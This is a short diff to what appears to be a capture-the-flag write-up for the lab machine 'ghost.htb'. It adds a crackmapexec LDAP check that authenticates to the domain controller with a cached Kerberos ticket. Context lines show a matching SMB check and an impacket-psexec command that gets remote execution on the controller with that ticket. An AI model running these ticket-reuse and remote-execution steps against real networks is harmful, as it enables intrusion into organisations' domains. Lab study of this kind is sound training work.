@@ -1039,6 +1039,10 @@ root@kali:~# crackmapexec smb DC01.ghost.htb --use-kcache
 SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
 SMB         ghost.htb       445    DC01             [+] ghost.htb\ from ccache
 
+root@kali:~# crackmapexec ldap DC01.ghost.htb --use-kcache
+SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
+LDAP        ghost.htb       389    DC01             [+] ghost.htb\florence.ramirez from ccache
+
 root@kali:~# impacket-psexec GHOST.HTB/florence.ramirez@DC01.ghost.htb -k -no-pass
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
